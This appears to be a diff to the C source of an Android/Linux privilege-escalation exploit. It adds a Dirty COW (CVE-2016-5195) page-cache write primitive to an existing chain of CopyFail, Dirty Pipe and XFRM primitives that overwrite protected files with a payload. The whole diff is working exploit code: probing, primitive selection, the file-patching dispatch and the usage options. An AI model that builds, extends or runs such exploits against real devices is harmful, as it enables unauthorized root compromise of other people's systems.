@@ -117,10 +117,12 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
     return 0;
 }
 
-/* Primitive selection. Auto order: CopyFail -> XFRM.
+/* Primitive selection. Auto order: CopyFail -> Dirty COW -> XFRM.
  *
  * CopyFail needs AF_ALG, which Android's app seccomp policy usually denies,
  * so a failed probe is normal and simply moves to the next candidate.
+ * Dirty COW covers the 4.x kernels where CopyFail's AEAD scratch write and
+ * the ESP path do not exist yet.
  * Dirty Pipe stays opt-in: it cannot write at a page boundary or across one,
  * which rules out the KO image (page-aligned, tens of KiB) it would need to
  * carry here.
@@ -128,11 +130,18 @@ static int read_vendor_content(off_t offset, uint8_t buf[16]) {
 static void select_primitive(const char *want)
 {
     if (!want || !strcmp(want, "auto")) {
-        g_prim = (pcw_copyfail_probe() == 0) ? PCW_COPYFAIL : PCW_XFRM;
+        if (pcw_copyfail_probe() == 0)
+            g_prim = PCW_COPYFAIL;
+        else if (pcw_dirtycow_probe() == 0)
+            g_prim = PCW_DIRTYCOW;
+        else
+            g_prim = PCW_XFRM;
     } else if (!strcmp(want, "copyfail")) {
         g_prim = (pcw_copyfail_probe() == 0) ? PCW_COPYFAIL : -1;
     } else if (!strcmp(want, "dirtypipe")) {
         g_prim = (pcw_dirtypipe_probe() == 0) ? PCW_DIRTYPIPE : -1;
+    } else if (!strcmp(want, "dirtycow")) {
+        g_prim = (pcw_dirtycow_probe() == 0) ? PCW_DIRTYCOW : -1;
     } else if (!strcmp(want, "xfrm")) {
         g_prim = PCW_XFRM;
     } else {
@@ -153,8 +162,12 @@ static void probe_report(void)
            "kernel in range, but sub-page unaligned writes only "
            "(opt-in; cannot carry the KO image)" :
            "not applicable (kernel outside 5.8-5.16 vulnerable branches)");
+    printf("dirtycow  (CVE-2016-5195): %s\n",
+           pcw_dirtycow_probe() == 0 ?
+           "kernel in vulnerable range (pre-4.8.3 / 4.7.9 / 4.4.26)" :
+           "not applicable (kernel fixed)");
     printf("xfrm      (CVE-2026-43284): requires the IpSecManager ESP path; "
-           "selected when both page-cache primitives are unavailable\n");
+           "selected when the page-cache primitives are unavailable\n");
 }
 
 /* Crash_dump bridge: hand the vendor file description back to us so
@@ -293,9 +306,13 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     /* Page-cache primitives take the whole run at once; only XFRM needs to
      * walk 16-byte ESP blocks. */
     if (g_prim != PCW_XFRM && g_prim >= 0 && wfd >= 0 && !g_prim_failed) {
-        int ok = (g_prim == PCW_COPYFAIL)
-                 ? pcw_copyfail_write_fd(wfd, (off_t)foff, payload, len)
-                 : pcw_dirtypipe_write_fd(wfd, (off_t)foff, payload, len);
+        int ok;
+        switch (g_prim) {
+        case PCW_COPYFAIL: ok = pcw_copyfail_write_fd(wfd, (off_t)foff, payload, len); break;
+        case PCW_DIRTYPIPE: ok = pcw_dirtypipe_write_fd(wfd, (off_t)foff, payload, len); break;
+        case PCW_DIRTYCOW: ok = pcw_dirtycow_write_fd(wfd, (off_t)foff, payload, len); break;
+        default: ok = -1; break;
+        }
         if (ok == 0) goto done;
         g_prim_failed = 1;
         printf("%s failed at 0x%zx, falling back to xfrm\n",
@@ -611,7 +628,7 @@ static int hex_to_bytes(const char *hex, uint8_t *out, size_t len) {
 static void usage(const char *argv0) {
     fprintf(stderr,
             "usage: %s --encap-port N --sender-port N --spi N --aes-key HEX "
-            "[--primitive auto|xfrm|copyfail|dirtypipe] [--probe]\n", argv0);
+            "[--primitive auto|xfrm|copyfail|dirtycow|dirtypipe] [--probe]\n", argv0);
 }
 
 static int setup(int argc, char **argv) {
